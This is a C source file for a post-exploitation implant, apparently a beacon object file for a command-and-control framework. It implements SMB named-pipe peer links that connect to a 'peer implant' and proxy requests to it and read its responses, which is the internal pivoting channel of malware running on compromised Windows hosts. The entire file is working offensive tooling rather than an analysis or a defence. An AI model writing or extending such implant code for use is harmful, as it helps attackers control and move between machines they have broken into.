#include <Implant.h>
#include <Coff.h>
#include <Stdlib.h>
#include "Peer.h"

BOOL SmbConnect( PEER_SMB_CONTEXT** Context, VOID* Config, DWORD ConfigSize ) {
    datap Parser;
    CHAR* PipeName = NULL;
    CHAR* Host     = NULL;

    BeaconDataParse( &Parser, (char*)Config, ConfigSize );
    PipeName = strdup( BeaconDataExtract( &Parser, NULL ) );

    // Allocate peer implant context
    *Context = (PEER_SMB_CONTEXT*)LocalAlloc( LMEM_ZEROINIT, sizeof( PEER_SMB_CONTEXT ) );
    if (!( *Context )) {
        printf( "LocalAlloc failed: ( %ld )\n", GetLastError() );
        return FALSE;
    }

    HANDLE hPipe = CreateFileA(
        PipeName,
        GENERIC_READ | GENERIC_WRITE, // Request read and write access
        0,                            // No sharing
        NULL,                         // Default security attributes
        OPEN_EXISTING,                // Must use OPEN_EXISTING for named pipes
        0,                            // Default attributes
        NULL                          // No template file
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        printf( "[-] Failed to connect. Error code: %lu\n", err );

        switch (err) {
        case 2:
            printf( "\t - ERROR_FILE_NOT_FOUND\n" );
            break;
        case 5:
            printf( "\t - ERROR_ACCESS_DENIED\n" );
            break;
        case 53:
            printf( "\t - ERROR_BAD_NETPATH\n" );
            break;
        }

        return FALSE;
    }

    // Set READ MESSAGE MODE
    DWORD mode = PIPE_READMODE_MESSAGE;
    if (!SetNamedPipeHandleState( hPipe, &mode, NULL, NULL )) {
        printf( "[-] Failed to set pipe state. Error: %lu\n", GetLastError() );
    } else {
        printf( "[+] Pipe state set to message mode.\n" );
    }

    ( *Context )->Pipe = hPipe;

    return TRUE;
}

BOOL SmbRead( PPEER_SMB_CONTEXT Context, VOID** Data, DWORD* DataSize ) {
    if (!ReadPipeAll( Context->Pipe, (BYTE**)Data, DataSize )) {
        printf( "ReadPipeAll failed: ( %ld )\n", GetLastError() );
        return FALSE;
    }

    return TRUE;
}

BOOL SmbRequest( PPEER_SMB_CONTEXT Context, VOID* Data, DWORD Size ) {
    printf( "proxying request to peer implant\n" );
    if (!WritePipeAll( Context->Pipe, Data, Size )) {
        printf( "WritePipeAll failed: ( %ld )\n", GetLastError() );
        return FALSE;
    }
    printf( "request proxied\n" );
    return TRUE;
}

BOOL SmbClose( PPEER_SMB_CONTEXT Context ) {
    CloseHandle( Context->Pipe );
    LocalFree( Context );
    return FALSE;
}
